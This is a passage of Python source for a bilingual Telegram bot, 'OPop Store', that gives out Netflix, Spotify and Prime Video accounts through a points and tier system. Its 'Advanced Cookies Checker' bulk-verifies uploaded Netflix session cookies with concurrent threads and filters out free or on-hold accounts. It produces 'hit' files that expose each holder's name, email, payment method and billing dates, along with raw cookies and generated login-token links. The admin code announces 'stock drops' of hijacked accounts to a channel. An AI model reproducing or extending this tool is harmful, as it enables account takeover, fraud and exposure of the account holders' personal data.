        final_txt = f"🎉 <b>Done! Successfully added {total_added} accounts.</b>\n\n✅ <b>Stock Updated! ({srv})</b>\n━━━━━━━━━━━━━━━━━━\n👑 Premium: <b>{stats['Premium']}</b>\n⭐ Standard: <b>{stats['Standard']}</b>\n🎯 Basic: <b>{stats['Basic']}</b>\n❓ Unknown: <b>{stats['Unknown']}</b>\n❌ Failed/Filtered: <b>{stats['failed']}</b>\n\n⚡ <i>Powered by OPop 👑</i>" if lang == "en" else f"🎉 <b>تم بنجاح! تمت إضافة {total_added} حساب.</b>\n\n✅ <b>تم تحديث المخزون! ({srv})</b>\n━━━━━━━━━━━━━━━━━━\n👑 Premium: <b>{stats['Premium']}</b>\n⭐ Standard: <b>{stats['Standard']}</b>\n🎯 Basic: <b>{stats['Basic']}</b>\n❓ Unknown: <b>{stats['Unknown']}</b>\n❌ Failed/Filtered: <b>{stats['failed']}</b>\n\n⚡ <i>Powered by OPop 👑</i>"
    else:
        total_added = stats['Premium']
        final_txt = f"🎉 <b>Done! Successfully added {stats['Premium']} accounts.</b>\n\n✅ <b>Stock Updated! ({srv})</b>\n━━━━━━━━━━━━━━━━━━\n👑 Total Added: <b>{stats['Premium']}</b>\n\n⚡ <i>Powered by OPop 👑</i>" if lang == "en" else f"🎉 <b>تم بنجاح! تمت إضافة {stats['Premium']} حساب.</b>\n\n✅ <b>تم تحديث المخزون! ({srv})</b>\n━━━━━━━━━━━━━━━━━━\n👑 Total Added: <b>{stats['Premium']}</b>\n\n⚡ <i>Powered by OPop 👑</i>"
        
    bot.edit_message_text(final_txt, chat_id, msg_id, parse_mode="HTML")

    if total_added > 0:
        m_drop = InlineKeyboardMarkup().row(InlineKeyboardButton("✅ Approve Drop", callback_data=f"adrop_yes_{srv}_{total_added}"), InlineKeyboardButton("❌ Cancel Drop", callback_data="adrop_no"))
        txt_ask = f"❓ <b>Send MASSIVE DROP announcement to channel?</b>\n\nService: <b>{srv}</b>\nAdded Accounts: <b>{total_added}</b>"
        bot.send_message(chat_id, txt_ask, reply_markup=m_drop, parse_mode="HTML")

@bot.callback_query_handler(func=lambda c: c.data.startswith("adrop_"))
def handle_auto_drop_approval(c):
    if c.message.chat.id != ADMIN_ID: return
    try: bot.answer_callback_query(c.id)
    except Exception: pass
    
    if c.data == "adrop_no": return bot.edit_message_text("❌ <b>Drop announcement cancelled.</b>", c.message.chat.id, c.message.message_id, parse_mode="HTML")
        
    parts = c.data.split("_")
    srv = parts[2]
    total_added = parts[3]
    
    drop_msg = (f"🚨 <b>𝗠𝗔𝗦𝗦𝗜𝗩𝗘 𝗦𝗧𝗢𝗖𝗞 𝗗𝗥𝗢𝗣!</b> 🚨\n━━━━━━━━━━━━━━━━━━\n🔥 <b>Added:</b> {total_added} accounts of <b>{srv}</b> to stock!\n🎁 <b>Action:</b> Take your account now!\n\n🔥 <b>تمت إضافة:</b> {total_added} حساب <b>{srv}</b> للمخزون!\n🎁 <b>الإجراء:</b> استلم حسابك الآن!\n━━━━━━━━━━━━━━━━━━\n📌 <b>Bot / البوت:</b> @{BOT_USERNAME}\n⚡ <i>Powered by OPop 👑</i>")
    try:
        bot.send_message(CHANNEL_USER, drop_msg, parse_mode="HTML")
        bot.edit_message_text("✅ <b>Drop announcement sent to channel successfully!</b>", c.message.chat.id, c.message.message_id, parse_mode="HTML")
    except Exception as e: bot.edit_message_text(f"❌ <b>Error sending drop:</b> {e}", c.message.chat.id, c.message.message_id, parse_mode="HTML")

# ==========================================
# 🍪 2. OPOP ADVANCED INDEPENDENT CHECKER
# ==========================================
def generate_result_file(hits_data, total_checked, source_name="Archive.zip"):
    now = datetime.now()
    out = []
    out.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    out.append("                 👑 OPOP ADVANCED CHECKER - V-GOD MAX 👑")
    out.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
    for i, acc in enumerate(hits_data, 1):
        out.append(f"====================== 🎯 HIT #{i} ======================")
        out.append("📋 ACCOUNT DETAILS")
        out.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        out.append(f"📇 Name:           {acc.get('name', 'N/A')}")
        out.append(f"✉️ Email:          {acc.get('email', 'N/A')}")
        out.append(f"🌍 Country:        {acc.get('cc', 'XX')} | 📺 Quality: {acc.get('quality', 'UHD')}")
        out.append(f"📋 Plan:           {acc.get('plan', 'N/A')} | 🎬 Streams: {acc.get('streams', '4')}")
        out.append(f"💳 Payment:        {acc.get('pay_method', 'N/A')} ({acc.get('card_brand', 'N/A')})")
        out.append(f"📅 Member Since:   {acc.get('member_since', 'N/A')}")
        out.append(f"🗓 Next Billing:   {acc.get('next_billing', 'N/A')}")
        out.append(f"👥 Profiles:       {', '.join(acc.get('profiles', []))}")
        out.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        out.append("🍪 RAW COOKIE")
        out.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        out.append(f"{acc.get('raw_clean', 'N/A')}\n")
        out.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        out.append("🔗 LOGIN LINKS")
        out.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        tok = acc.get('token', '')
        if tok:
            t_safe = urllib.parse.quote(tok, safe='')
            l_pc = f"https://www.netflix.com/ProfilesGate?nftoken={t_safe}"
            l_ph = f"https://www.netflix.com/unsupported?nftoken={t_safe}"
            l_tv = "https://www.netflix.com/tv2"
        else:
            l_pc = l_ph = l_tv = "N/A (Token Generation Failed or Live Check Mode)"
        out.append(f"💻 PC:    {l_pc}")
        out.append(f"📱 Phone: {l_ph}")
        out.append(f"📺 TV:    {l_tv}\n")
        out.append("==============================================================\n\n")
    return "\n".join(out)

def run_live_checker(msg, file_content, filename, filter_free, filter_hold, split_tier, lang):
    chat_id = msg.chat.id
    
    effect_msgs = ["⏳ <i>[■■□□□□] Intercepting data stream...</i>", "⏳ <i>[■■■■□□] Scanning <b>{filename}</b>...</i>", "⏳ <i>[■■■■■□] Extracting Cookies...</i>"]
    for eff in effect_msgs:
        try: bot.edit_message_text(eff, chat_id, msg.message_id, parse_mode="HTML"); time.sleep(0.4) 
        except Exception: pass

    valid_formats = extract_netflix_tokens(file_content)
    total = len(valid_formats)
    
    try: bot.edit_message_text(f"⏳ <i>[■■■■■■] Engine loaded <b>{total}</b> cookies!</i>\n<i>💥 Starting V-GOD Verification... 👑</i>", chat_id, msg.message_id, parse_mode="HTML"); time.sleep(0.6)
    except Exception: pass
    
    if total == 0: return bot.edit_message_text("❌ لم يتم العثور على أي كوكيز صالح لنتفليكس." if lang=="ar" else "❌ No valid Netflix Cookies found.", chat_id, msg.message_id)

    stats = {"checked": 0, "hits": 0, "failed": 0, "filtered": 0}
    hits_data = []
    is_stopped = [False]

    def stop_checker(c): 
        is_stopped[0] = True
        try: bot.edit_message_reply_markup(chat_id, c.message.message_id, reply_markup=None)
        except Exception: pass
        bot.answer_callback_query(c.id, "🛑 Emergency Stop! Generating results found so far...", show_alert=True)
        
    bot.register_callback_query_handler(stop_checker, func=lambda c: c.data == f"stop_check_{chat_id}")

    m_stop = InlineKeyboardMarkup().add(InlineKeyboardButton("🛑 Stop Engine", callback_data=f"stop_check_{chat_id}"))

    def update_ui():
        bar = get_progress_bar(stats['checked'], total, style="blocks")
        pct = int((stats['checked'] / total) * 100)
        text = (f"🌩️ <b>OPOP Engine Active...</b> 🔍\n⏳ <i>[{bar}] {pct}%</i>\n\n🔎 <b>Processing:</b> {stats['checked']}/{total}\n✅ Hits: <b>{stats['hits']}</b> | 🛡 Filtered: <b>{stats['filtered']}</b>\n❌ Failed: <b>{stats['failed']}</b>\n\n💡 <i>Tip: The engine is analyzing and extracting automatically.</i>")
        try: bot.edit_message_text(text, chat_id, msg.message_id, parse_mode="HTML", reply_markup=m_stop)
        except Exception: pass

    last_update = time.time()

    with ThreadPoolExecutor(max_workers=15) as executor:
        for acc in executor.map(check_netflix_account, valid_formats):
            if is_stopped[0]: break
            stats["checked"] += 1
            if acc:
                skip = False
                if filter_free and acc["plan"] == "Unknown": skip = True
                if filter_hold and acc["hold"] == "Yes": skip = True
                if skip: stats["filtered"] += 1
                else: 
                    acc['token'] = generate_nftoken_live(acc.get('nf_id', ''), acc.get('sec_id', ''))
                    stats["hits"] += 1; hits_data.append(acc)
            else: stats["failed"] += 1
            
            if time.time() - last_update > 3.0:
                update_ui(); last_update = time.time()

    stop_warning = "\n⚠️ <b>PROCESS STOPPED BY ADMIN!</b>" if is_stopped[0] else ""
    final_txt = (f"📊 <b>Batch Complete</b>{stop_warning}\n━━━━━━━━━━━━━━━━━━\n📦 Checked: {stats['checked']}/{total}\n✅ Hits: {stats['hits']}\n🛡️ Filtered: {stats['filtered']}\n❌ Failed: {stats['failed']}\n\n⚡ <i>Powered by OPop 👑</i>")

    try: bot.edit_message_text(final_txt, chat_id, msg.message_id, parse_mode="HTML")
    except Exception: pass

    if stats["hits"] > 0:
        ts = datetime.now().strftime('%Y%m%d_%H%M%S')
        if split_tier:
            tiers = {"Premium": [], "Standard": [], "Basic": [], "Unknown": []}
            for acc in hits_data: tiers[acc["tier"]].append(acc)
            for t_name, t_list in tiers.items():
                if t_list:
                    out_content = generate_result_file(t_list, total, filename)
                    for _ in range(3):
                        try:
                            bot.send_document(chat_id, (f"OPOP_results_{t_name.lower()}_{len(t_list)}hits_{ts}.txt", BytesIO(out_content.encode('utf-8', errors='replace'))), caption=f"✅ {len(t_list)} {t_name} hits from {total} cookies", reply_to_message_id=msg.message_id, timeout=60)
                            break
                        except Exception: time.sleep(2)
        else:
            out_content = generate_result_file(hits_data, total, filename)
            for _ in range(3):
                try:
                    bot.send_document(chat_id, (f"OPOP_results_{stats['hits']}hits_{ts}.txt", BytesIO(out_content.encode('utf-8', errors='replace'))), caption=f"✅ {stats['hits']} hits from {total} cookies", reply_to_message_id=msg.message_id, timeout=60)
                    break
                except Exception: time.sleep(2)

        clean_lines = [f"NetflixId={acc.get('nf_id','')}" for acc in hits_data if acc.get('nf_id')]
        if clean_lines:
            for _ in range(3):
                try:
                    bot.send_document(chat_id, (f"OPOP_cookies_{stats['hits']}hits_{ts}.txt", BytesIO("\n".join(clean_lines).encode('utf-8', errors='replace'))), caption=f"🍪 All {stats['hits']} cookies (NetflixId= format)", reply_to_message_id=msg.message_id, timeout=60)
                    break
                except Exception: time.sleep(2)

@bot.callback_query_handler(func=lambda c: c.data == "checker_confirm")
def step2_filter_free_prompt(c):
    try: bot.answer_callback_query(c.id)
    except Exception: pass
    
    temp_users = load_db(USERS_FILE, {})
    lang = temp_users.get(str(c.message.chat.id), {}).get("lang", "en")
    
    m = InlineKeyboardMarkup()
    if lang == "en":
        m.row(InlineKeyboardButton("✅ Yes", callback_data="checker_ffree_yes"), InlineKeyboardButton("❌ No", callback_data="checker_ffree_no"))
        bot.edit_message_text("🛡️ <b>Step 2/4: Filter free cookies?</b>\n<blockquote>💡 Skip accounts with unknown plan</blockquote>", c.message.chat.id, c.message.message_id, reply_markup=m, parse_mode="HTML")
    else:
        m.row(InlineKeyboardButton("✅ نعم", callback_data="checker_ffree_yes"), InlineKeyboardButton("❌ لا", callback_data="checker_ffree_no"))
        bot.edit_message_text("🛡️ <b>الخطوة 2/4: هل ترغب في تصفية الحسابات المجانية؟</b>\n<blockquote>💡 تخطي الحسابات التي لا تحتوي على خطة صالحة</blockquote>", c.message.chat.id, c.message.message_id, reply_markup=m, parse_mode="HTML")

@bot.callback_query_handler(func=lambda c: c.data.startswith("checker_ffree_"))
def step3_filter_hold_prompt(c):
    try: bot.answer_callback_query(c.id)
    except Exception: pass
    chat_id = c.message.chat.id
    if chat_id not in CHECKER_SESSIONS: return
    CHECKER_SESSIONS[chat_id]["filter_free"] = (c.data == "checker_ffree_yes")
    
    temp_users = load_db(USERS_FILE, {})
    lang = temp_users.get(str(chat_id), {}).get("lang", "en")
    
    m = InlineKeyboardMarkup()
    if lang == "en":
        m.row(InlineKeyboardButton("✅ Yes", callback_data="checker_fhold_yes"), InlineKeyboardButton("❌ No", callback_data="checker_fhold_no"))
        bot.edit_message_text("🛑 <b>Step 3/4: Filter Hold cookies?</b>\n<blockquote>💡 Skip accounts with payment issues</blockquote>", chat_id, c.message.message_id, reply_markup=m, parse_mode="HTML")
    else:
        m.row(InlineKeyboardButton("✅ نعم", callback_data="checker_fhold_yes"), InlineKeyboardButton("❌ لا", callback_data="checker_fhold_no"))
        bot.edit_message_text("🛑 <b>الخطوة 3/4: هل ترغب في تصفية الحسابات الموقوفة (Hold)؟</b>\n<blockquote>💡 تخطي الحسابات التي تواجه مشاكل في الدفع</blockquote>", chat_id, c.message.message_id, reply_markup=m, parse_mode="HTML")

@bot.callback_query_handler(func=lambda c: c.data.startswith("checker_fhold_"))
def step4_split_prompt(c):
    try: bot.answer_callback_query(c.id)
    except Exception: pass
    chat_id = c.message.chat.id
    if chat_id not in CHECKER_SESSIONS: return
    CHECKER_SESSIONS[chat_id]["filter_hold"] = (c.data == "checker_fhold_yes")
    
    temp_users = load_db(USERS_FILE, {})
    lang = temp_users.get(str(chat_id), {}).get("lang", "en")
    
    m = InlineKeyboardMarkup()
    if lang == "en":
        m.row(InlineKeyboardButton("📂 Split by Tier", callback_data="checker_split_yes"), InlineKeyboardButton("📄 Combined File", callback_data="checker_split_no"))
        bot.edit_message_text("⚙️ <b>Step 4/4: Output Format?</b>\n<blockquote>💡 Do you want hits separated by Premium/Standard or all in one file?</blockquote>", chat_id, c.message.message_id, reply_markup=m, parse_mode="HTML")
    else:
        m.row(InlineKeyboardButton("📂 فصل حسب الخطة", callback_data="checker_split_yes"), InlineKeyboardButton("📄 ملف واحد مدمج", callback_data="checker_split_no"))
        bot.edit_message_text("⚙️ <b>الخطوة 4/4: كيف تفضل تنسيق النتائج؟</b>\n<blockquote>💡 فصل حسابات Premium عن Standard أم دمجها في ملف واحد؟</blockquote>", chat_id, c.message.message_id, reply_markup=m, parse_mode="HTML")

@bot.callback_query_handler(func=lambda c: c.data.startswith("checker_split_"))
def checker_execute_cb(c):
    try: bot.answer_callback_query(c.id)
    except Exception: pass
    chat_id = c.message.chat.id
    if chat_id not in CHECKER_SESSIONS: return
    split_tier = (c.data == "checker_split_yes")
    session_data = CHECKER_SESSIONS.pop(chat_id)
    filter_free = session_data["filter_free"]
    filter_hold = session_data["filter_hold"]
    
    temp_users = load_db(USERS_FILE, {})
    lang = temp_users.get(str(chat_id), {}).get("lang", "en")
    
    bot.edit_message_text("🚀 <b>جاري تشغيل محرك الفحص الشامل...</b>" if lang=="ar" else "🚀 <b>Starting The Ultimate Checker Engine...</b>", chat_id, c.message.message_id, parse_mode="HTML")
    threading.Thread(target=run_live_checker, args=(c.message, session_data["content"], session_data["filename"], filter_free, filter_hold, split_tier, lang)).start()

def process_checker_file_start(message, lang):
    chat_id = message.chat.id
    if message.text and message.text.startswith('/'):
        bot.clear_step_handler_by_chat_id(chat_id)
        return bot.send_message(chat_id, "❌ تم إلغاء الفحص بسبب إرسال أمر جديد." if lang == "ar" else "❌ Operation cancelled. Received a new command.", parse_mode="HTML")
    if not message.content_type in ['text', 'document']:
        return bot.send_message(chat_id, "❌ صيغة الملف غير صالحة." if lang=="ar" else "❌ Invalid format.", parse_mode="HTML")
    try:
        content, filename = "", "text_input.txt"
        if message.content_type == 'text': content = message.text
        else:
            filename = message.document.file_name
            down = bot.download_file(bot.get_file(message.document.file_id).file_path)
            if filename.endswith('.zip'):
                with zipfile.ZipFile(BytesIO(down)) as z:
                    for fn in z.namelist():
                        if fn.endswith('.txt'): content += z.read(fn).decode('utf-8', errors='ignore') + "\n"
            else: content = down.decode('utf-8', errors='ignore')
            
        CHECKER_SESSIONS[chat_id] = {"content": content, "filename": filename, "filter_free": None, "filter_hold": None}
        m = InlineKeyboardMarkup()
        if lang == "en":
            m.row(InlineKeyboardButton("✅ Confirm & Start", callback_data="checker_confirm"), InlineKeyboardButton("❌ Cancel", callback_data="main_menu"))
            bot.reply_to(message, f"📦 <b>File received:</b> <code>{filename}</code>\n━━━━━━━━━━━━━━━━━━\n⚡ <b>Step 1/4:</b> Ready to configure? ⚙️️", reply_markup=m, parse_mode="HTML")
        else:
            m.row(InlineKeyboardButton("✅ تأكيد وبدء الإعدادات", callback_data="checker_confirm"), InlineKeyboardButton("❌ إلغاء", callback_data="main_menu"))
            bot.reply_to(message, f"📦 <b>تم استلام الملف:</b> <code>{filename}</code>\n━━━━━━━━━━━━━━━━━━\n⚡ <b>الخطوة 1/4:</b> هل أنت مستعد للبدء؟ ⚙️", reply_markup=m, parse_mode="HTML")
    except Exception as e: bot.reply_to(message, f"<blockquote>❌ Error: {e}</blockquote>", parse_mode="HTML")

# ==========================================
# 🎨 DYNAMIC UI & PRO DASHBOARD
# ==========================================
def language_markup(): return InlineKeyboardMarkup().add(InlineKeyboardButton("🇺🇸 English", callback_data="lang_en"), InlineKeyboardButton("🇵🇸 العربية", callback_data="lang_ar"))

def get_limit_markup(lang):
    m = InlineKeyboardMarkup()
    m.row(InlineKeyboardButton("🔗 Invite Friends (+50⚡)", callback_data="ref_link")) if lang=="en" else m.row(InlineKeyboardButton("🔗 دعوة الأصدقاء (+50⚡)", callback_data="ref_link"))
    m.row(InlineKeyboardButton("💎 Plans & Pricing (Upgrade)", callback_data="redeem_menu")) if lang=="en" else m.row(InlineKeyboardButton("💎 الخطط والأسعار (ترقية الرتبة)", callback_data="redeem_menu"))
    m.row(InlineKeyboardButton("🏠 Back to Main", callback_data="main_menu")) if lang=="en" else m.row(InlineKeyboardButton("🏠 العودة للرئيسية", callback_data="main_menu"))
    return m

def dashboard_text(uid, first_name):
    first_name = html.escape(str(first_name))
    u = process_drip(load_db(USERS_FILE, {}).get(str(uid), {}))
    lang = u.get("lang", "en")
    is_admin = u.get("is_admin", False)
    tier = u.get("tier", "Free")
    rank = "👑 <b>OWNER / SUPER PRO</b>" if is_admin else f"⭐ <b>{tier}</b>"

    if is_admin:
        available_str, energy_bar, status_line, reserve_txt, points_txt, cap = "Unlimited", "[██████████] ∞", ("🟢 <i>Ready - Admin</i>" if lang=="en" else "🟢 <i>جاهز - مسؤول</i>"), "+∞⚡", "Unlimited", "∞"
    else:
        cap = TIERS.get(tier, TIERS["Free"])["cap"]
        energy, reserve, pts = u.get("energy", 0.0), u.get("reserve", 0.0), u.get("points", 0.0)
        available_str = f"{int(energy)}⚡"
        if energy > 0:
            bar_fill = int((energy / cap) * 10) if cap > 0 else 10
            energy_bar = "[" + "█" * bar_fill + "░" * (10 - bar_fill) + f"] {int(energy)}/{cap}⚡"
            status_line = "🟢 <i>Ready to pull</i>" if energy >= 30 else ("🟡 <i>Low Energy</i>" if lang == "en" else "🟡 <i>طاقة منخفضة</i>")
        else:
            energy_bar, status_line = "[□□□□□□□□□□] 0", ("🔴 <i>Depleted - Recharge Now</i>" if lang == "en" else "🔴 <i>مستنفدة - قم بالشحن</i>")
        reserve_txt, points_txt = f"+{int(reserve)}⚡", f"{pts}/1.0 🎁"

    if lang == "en":
        return ("╔══════════════════════════════════════╗\n"
                "       ✨ <b>WELCOME TO OPOP STORE</b> ✨       \n"
                "╚══════════════════════════════════════╝\n\n"
                f"📇 <b><i>User Profile:</i></b>\n"
                f"┣ 📇 <i>Name:</i> <b>{first_name}</b>\n"
                f"┣ 🆔 <i>ID:</i> <tg-spoiler>{uid}</tg-spoiler>\n"
                f"┣ 🌍 <i>Language:</i> <b>English</b>\n"
                f"┗ 👑 <i>Status:</i> {rank}\n\n"
                f"📢 <b><i>Official Network:</i></b>\n"
                f"┗ 📌 <i>Channel:</i> <a href='{CHANNEL_LINK}'>OPop Official Channel</a>\n\n"
                f"Rules & Limits:\n"
                f"┣ ⚡ <i>Limit:</i> <b>Max Capacity {cap}⚡</b>\n"
                f"┗ ⏳ <i>Window:</i> <b>Auto-Drip System Active</b>\n\n"
                f"Your Real-Time Status:\n"
                f"┣ 🔋 <i>Energy:</i> {energy_bar}\n"
                f"┣ 📦 <i>Reserve Tank:</i> <b>{reserve_txt}</b>\n"
                f"┣ 🎟️ <i>Bonus Points:</i> <b>{points_txt}</b>\n"
                f"┗ 🔄 <i>Status:</i> {status_line}\n\n"
                f"💡 <i>Tip: Use the buttons below to navigate.</i> ❞\n"
                f"⚡ <i>Powered by OPop 👑</i>")
    else:
        return ("╔══════════════════════════════════════╗\n"
                "       ✨ <b>مرحباً بك في متجر OPOP</b> ✨       \n"
                "╚══════════════════════════════════════╝\n\n"
                f"📇 <b><i>الملف الشخصي:</i></b>\n"
                f"┣ 📇 <i>الاسم:</i> <b>{first_name}</b>\n"
                f"┣ 🆔 <i>المعرف:</i> <tg-spoiler>{uid}</tg-spoiler>\n"
                f"┣ 🌍 <i>اللغة:</i> <b>العربية</b>\n"
                f"┗ 👑 <i>الرتبة:</i> {rank}\n\n"
                f"📢 <b><i>الشبكة الرسمية:</i></b>\n"
                f"┗ 📌 <i>القناة:</i> <a href='{CHANNEL_LINK}'>قناة OPop الرسمية</a>\n\n"
                f"القواعد والقيود:\n"
                f"┣ ⚡ <i>الحد الأقصى:</i> <b>سعة {cap}⚡</b>\n"
                f"┗ ⏳ <i>النافذة الزمنية:</i> <b>شحن تلقائي نشط</b>\n\n"
                f"حالتك الحالية:\n"
                f"┣ 🔋 <i>الطاقة:</i> {energy_bar}\n"
                f"┣ 📦 <i>الخزان الاحتياطي:</i> <b>{reserve_txt}</b>\n"
                f"┣ 🎟️ <i>نقاط المكافأة:</i> <b>{points_txt}</b>\n"
                f"┗ 🔄 <i>الحالة:</i> {status_line}\n\n"
                f"💡 <i>تلميح: استخدم الأزرار أدناه للتنقل بحرية.</i> ❞\n"
                f"⚡ <i>Powered by OPop 👑</i>")

def main_menu(uid, lang):
    pts = load_db(USERS_FILE, {}).get(str(uid), {}).get("points", 0.0)
    m = InlineKeyboardMarkup()
    if lang == "en":
        m.row(InlineKeyboardButton("🎬 Netflix", callback_data="srv_Netflix"), InlineKeyboardButton("🎵 Spotify", callback_data="srv_Spotify"))
        m.add(InlineKeyboardButton("🍿 Prime Video", callback_data="srv_PrimeVideo"))
        m.row(InlineKeyboardButton("📦 Stock", callback_data="stock"), InlineKeyboardButton("💎 Plans & Pricing", callback_data="redeem_menu"))
        m.add(InlineKeyboardButton(f"🎁 Daily Bonus (Pts: {pts})", callback_data="daily_bonus"))
        m.add(InlineKeyboardButton("🍪 Advanced Cookies Checker", callback_data="open_checker"))
        m.row(InlineKeyboardButton("🌐 Language", callback_data="ch_lang"), InlineKeyboardButton("📖 How to use", callback_data="mini_guide"))
        m.add(InlineKeyboardButton("➕ More Services", callback_data="more_menu"))
    else:
        m.row(InlineKeyboardButton("🎬 نتفليكس", callback_data="srv_Netflix"), InlineKeyboardButton("🎵 سبوتيفاي", callback_data="srv_Spotify"))
        m.add(InlineKeyboardButton("🍿 برايم فيديو", callback_data="srv_PrimeVideo"))
        m.row(InlineKeyboardButton("📦 المخزون", callback_data="stock"), InlineKeyboardButton("💎 الخطط والأسعار", callback_data="redeem_menu"))
        m.add(InlineKeyboardButton(f"🎁 المكافأة اليومية (النقاط: {pts})", callback_data="daily_bonus"))
        m.add(InlineKeyboardButton("🍪 فاحص الكوكيز المتقدم", callback_data="open_checker"))
        m.row(InlineKeyboardButton("🌐 اللغة", callback_data="ch_lang"), InlineKeyboardButton("📖 طريقة الاستعمال", callback_data="mini_guide"))
        m.add(InlineKeyboardButton("➕ المزيد من الخدمات", callback_data="more_menu"))
    return m

def netflix_dynamic_menu(lang, tier="Free"):
    s = init_stock().get("Netflix", {})
    p, st, b = len(s.get("Premium", [])), len(s.get("Standard", [])), len(s.get("Basic", []))
    m = InlineKeyboardMarkup()
    t = get_costs(tier)
    if lang == "en":
        m.row(InlineKeyboardButton(f"👑 Premium ({p}) - {t['cost_p']}⚡", callback_data="pull_Netflix_Premium"), InlineKeyboardButton(f"⭐ Standard ({st}) - {t['cost_s']}⚡", callback_data="pull_Netflix_Standard"))
        m.add(InlineKeyboardButton(f"🎯 Basic ({b}) - {t['cost_b']}⚡", callback_data="pull_Netflix_Basic"))
        m.add(InlineKeyboardButton(f"🎲 Mystery Box (Dice) - {t['cost_dice']}⚡", callback_data="pull_Netflix_Dice"))
        m.add(InlineKeyboardButton("🏠 Back to Main", callback_data="main_menu"))
    else:
        m.row(InlineKeyboardButton(f"👑 Premium ({p}) - {t['cost_p']}⚡", callback_data="pull_Netflix_Premium"), InlineKeyboardButton(f"⭐ Standard ({st}) - {t['cost_s']}⚡", callback_data="pull_Netflix_Standard"))
        m.add(InlineKeyboardButton(f"🎯 Basic ({b}) - {t['cost_b']}⚡", callback_data="pull_Netflix_Basic"))
        m.add(InlineKeyboardButton(f"🎲 صندوق الحظ (النرد) - {t['cost_dice']}⚡", callback_data="pull_Netflix_Dice"))
        m.add(InlineKeyboardButton("🏠 العودة للرئيسية", callback_data="main_menu"))
    return m

def dynamic_pull_menu(lang, srv, tier="Free"):
    s = init_stock().get(srv, {})
    p = len(s.get("Premium", []))
    m = InlineKeyboardMarkup()
    t = get_costs(tier)
    m.row(InlineKeyboardButton(f"👑 Premium ({p}) - {t['cost_p']}⚡", callback_data=f"pull_{srv}_Premium"))
    m.add(InlineKeyboardButton("🏠 Back to Main" if lang=="en" else "🏠 العودة للرئيسية", callback_data="main_menu"))
    return m

def more_services_menu(uid, lang):
    m = InlineKeyboardMarkup()
    if lang == "en":
        m.add(InlineKeyboardButton("👤 My Account Info", callback_data="my_info"))
        m.row(InlineKeyboardButton("📡 Bot Ping", callback_data="bot_ping"), InlineKeyboardButton("🎟️ Promo Code", callback_data="promo_menu"))
        m.row(InlineKeyboardButton("🎁 Gift Energy", callback_data="gift_info"), InlineKeyboardButton("🔗 Referral Link", callback_data="ref_link"))
        m.add(InlineKeyboardButton("📖 User Guide", callback_data="guide_menu"))
        m.row(InlineKeyboardButton("💬 Contact Admin", url=f"https://t.me/{OWNER_USERNAME}"), InlineKeyboardButton("📢 Our Channel", url=CHANNEL_LINK))
        m.add(InlineKeyboardButton("✉️ Support Center", callback_data="support_info"))
        m.add(InlineKeyboardButton("🏠 Back to Main", callback_data="main_menu"))
        m.add(InlineKeyboardButton("✨ Thank you for using OPop Store! ✨", callback_data="ignore"))
    else:
        m.add(InlineKeyboardButton("👤 معلومات حسابي", callback_data="my_info"))
        m.row(InlineKeyboardButton("📡 حالة الخادم (Ping)", callback_data="bot_ping"), InlineKeyboardButton("🎟️ الرمز الترويجي", callback_data="promo_menu"))
        m.row(InlineKeyboardButton("🎁 إهداء الطاقة", callback_data="gift_info"), InlineKeyboardButton("🔗 رابط الإحالة", callback_data="ref_link"))
        m.add(InlineKeyboardButton("📖 دليل الاستخدام", callback_data="guide_menu"))
        m.row(InlineKeyboardButton("💬 تواصل مع الإدارة", url=f"https://t.me/{OWNER_USERNAME}"), InlineKeyboardButton("📢 قناتنا الرسمية", url=CHANNEL_LINK))
        m.add(InlineKeyboardButton("✉️ مركز الدعم الفني", callback_data="support_info"))
        m.add(InlineKeyboardButton("🏠 العودة للرئيسية", callback_data="main_menu"))
        m.add(InlineKeyboardButton("✨ شكراً لاستعمالكم OPop Store! ✨", callback_data="ignore"))
    return m

def redeem_menu_markup(lang):
    m = InlineKeyboardMarkup()
    if lang == "en":
        m.add(InlineKeyboardButton("💡 VIP Plans & Ranks Details", callback_data="what_is_key"))
        m.add(InlineKeyboardButton("💬 Buy Plan / Contact Admin", url=f"https://t.me/{OWNER_USERNAME}"))
        m.add(InlineKeyboardButton("🏠 Back", callback_data="main_menu"))
    else:
        m.add(InlineKeyboardButton("💡 تفاصيل رتب وخطط VIP", callback_data="what_is_key"))
        m.add(InlineKeyboardButton("💬 شراء خطة / تواصل مع الإدارة", url=f"https://t.me/{OWNER_USERNAME}"))
        m.add(InlineKeyboardButton("🏠 الرجوع", callback_data="main_menu"))
    return m

# ==========================================
# ✉️ TICKET SYSTEM LOGIC
# ==========================================
def process_support_ticket(message, lang):
    safe_name = html.escape(str(message.from_user.first_name))
    safe_msg = html.escape(str(message.text))
    uname = f"@{message.from_user.username}" if message.from_user.username else "No Username"
    m_admin = InlineKeyboardMarkup().add(InlineKeyboardButton("📄 Reply", callback_data=f"reply_ticket_{message.chat.id}"))
    bot.send_message(ADMIN_ID, f"📩 <b>New Support Ticket!</b>\n━━━━━━━━━━━━━━━━━━\n👨‍‍💻 <b>User:</b> {safe_name}\n🔗 <b>Username:</b> {uname}\n🆔 <b>ID:</b> <code>{message.chat.id}</code>\n📝 <b>Message:</b>\n{safe_msg}\n━━━━━━━━━━━━━━━━━━", reply_markup=m_admin, parse_mode="HTML")
    msg_en = "✅ <b>𝗧𝗜𝗖𝗞𝗘𝗧 𝗦𝗨𝗕𝗠𝗜𝗧𝗧𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬</b>\n━━━━━━━━━━━━━━━━━━\nYour message has been securely routed to the Admin.\nPlease wait for a response here. 🎧"
    msg_ar = "✅ <b>تم استلام تذكرتك بنجاح</b>\n━━━━━━━━━━━━━━━━━━\nتم توجيه رسالتك بشكل آمن إلى الإدارة.\nيرجى انتظار الرد هنا قريباً. 🎧"
